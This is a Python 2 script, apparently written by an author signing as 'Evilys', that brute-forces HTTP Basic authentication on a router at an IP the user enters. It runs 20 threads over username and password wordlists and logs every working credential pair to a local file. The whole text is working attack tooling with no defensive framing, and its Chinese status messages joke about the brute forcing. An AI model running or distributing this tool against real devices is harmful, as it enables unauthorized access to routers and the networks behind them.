#coding:utf-8-
import base64
import urllib2
import Queue
import threading,re,sys
queue = Queue.Queue()
class Rout_thread(threading.Thread):
 
  def __init__(self,queue,passwd):
 
    threading.Thread.__init__(self)
    self.queue=queue
    self.passwordlist=passwd
  def run(self):
    self.user=queue.get()
    for self.passwd in self.passwordlist:
      request = urllib2.Request("http://"+target)
      psw_base64 = "Basic " + base64.b64encode(self.user + ":" + self.passwd)
      request.add_header('Authorization', psw_base64)
      try:
        
        response = urllib2.urlopen(request)
        print "[+]Success! Username: %s, Password: %s" % (self.user,self.passwd)     
        fp3 = open('记录.txt','a')
        fp3.write(self.user+'||'+self.passwd+'\r\n')
        fp3.close()
      except urllib2.HTTPError:
        print "[-]password：%s ---Error!" % (self.passwd)
        
 
if __name__ == '__main__':
  print '''
    #######################################################
    #                                                     #
    #                Blasting router                      #
    #                                                     #
    #                 by:Evilys                           #
    #                                                     #
    #######################################################
'''
  passwordlist = []
  line = 20
  threads = []
  global target
  target = raw_input("input test ip：")
  fp =open("user.txt")
  fp2=open("passwd.txt")
  print '\n[+] 暴力爆菊中……╭(╯3╰)╮\n'
  print '\n[+] 日志保存在同目录下……╭(╯3╰)╮\n'
  for user in fp.readlines():
    queue.put(user.split('\n')[0])
  for passwd in fp2.readlines():
    passwordlist.append(passwd.split('\n')[0])
    #print passwordlist
  fp.close()
  fp2.close()
  for i in range(line):
    a = Rout_thread(queue,passwordlist)
    a.start()
    threads.append(a)
  for j in threads:
    j.join()
